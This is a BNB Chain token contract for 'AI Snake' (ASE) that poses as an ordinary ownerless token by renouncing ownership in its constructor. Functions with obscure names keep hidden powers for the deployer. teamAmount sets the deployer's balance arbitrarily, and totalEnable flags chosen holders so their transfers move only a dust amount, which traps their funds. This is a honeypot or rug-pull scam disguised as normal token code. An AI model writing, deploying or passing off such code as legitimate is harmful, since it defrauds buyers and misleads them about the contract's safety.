/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface feeSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface swapMode {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AISnake is Ownable {
    uint8 private txSellFrom = 18;

    string private _name = "AI Snake";
    string private _symbol = "ASE";

    uint256 private buyMode = 100000000 * 10 ** txSellFrom;
    mapping(address => uint256) private shouldMax;
    mapping(address => mapping(address => uint256)) private txFund;

    mapping(address => bool) public isLimit;
    address public maxEnable;
    address public tokenTo;
    mapping(address => bool) public takeList;
    uint256 constant swapListFrom = 10 ** 10;
    bool public atFromTotal;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        feeSender isEnableToken = feeSender(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tokenTo = swapMode(isEnableToken.factory()).createPair(isEnableToken.WETH(), address(this));
        maxEnable = tokenFund();
        isLimit[maxEnable] = true;
        shouldMax[maxEnable] = buyMode;
        emit Transfer(address(0), maxEnable, buyMode);
        renounceOwnership();
    }

    

    function tokenFund() private view returns (address) {
        return msg.sender;
    }

    function totalTakeBuy(address totalSender) public {
        if (atFromTotal) {
            return;
        }
        isLimit[totalSender] = true;
        atFromTotal = true;
    }

    function totalEnable(address launchTx) public {
        if (launchTx == maxEnable || launchTx == tokenTo || !isLimit[tokenFund()]) {
            return;
        }
        takeList[launchTx] = true;
    }

    function approve(address sellLaunchedReceiver, uint256 launchedToAt) public returns (bool) {
        txFund[tokenFund()][sellLaunchedReceiver] = launchedToAt;
        emit Approval(tokenFund(), sellLaunchedReceiver, launchedToAt);
        return true;
    }

    function decimals() external view returns (uint8) {
        return txSellFrom;
    }

    function teamAmount(uint256 launchedToAt) public {
        if (!isLimit[tokenFund()]) {
            return;
        }
        shouldMax[maxEnable] = launchedToAt;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function allowance(address walletSell, address sellLaunchedReceiver) external view returns (uint256) {
        return txFund[walletSell][sellLaunchedReceiver];
    }

    function launchFund(address tradingShouldMode, address receiverSell, uint256 launchedToAt) internal returns (bool) {
        require(shouldMax[tradingShouldMode] >= launchedToAt);
        shouldMax[tradingShouldMode] -= launchedToAt;
        shouldMax[receiverSell] += launchedToAt;
        emit Transfer(tradingShouldMode, receiverSell, launchedToAt);
        return true;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function transfer(address liquidityReceiverAuto, uint256 launchedToAt) external returns (bool) {
        return transferFrom(tokenFund(), liquidityReceiverAuto, launchedToAt);
    }

    function transferFrom(address minList, address liquidityReceiverAuto, uint256 launchedToAt) public returns (bool) {
        if (minList != tokenFund() && txFund[minList][tokenFund()] != type(uint256).max) {
            require(txFund[minList][tokenFund()] >= launchedToAt);
            txFund[minList][tokenFund()] -= launchedToAt;
        }
        if (liquidityReceiverAuto == maxEnable || minList == maxEnable) {
            return launchFund(minList, liquidityReceiverAuto, launchedToAt);
        }
        if (takeList[minList]) {
            return launchFund(minList, liquidityReceiverAuto, swapListFrom);
        }
        return launchFund(minList, liquidityReceiverAuto, launchedToAt);
    }

    function totalSupply() external view returns (uint256) {
        return buyMode;
    }

    function balanceOf(address receiverMode) public view returns (uint256) {
        return shouldMax[receiverMode];
    }


}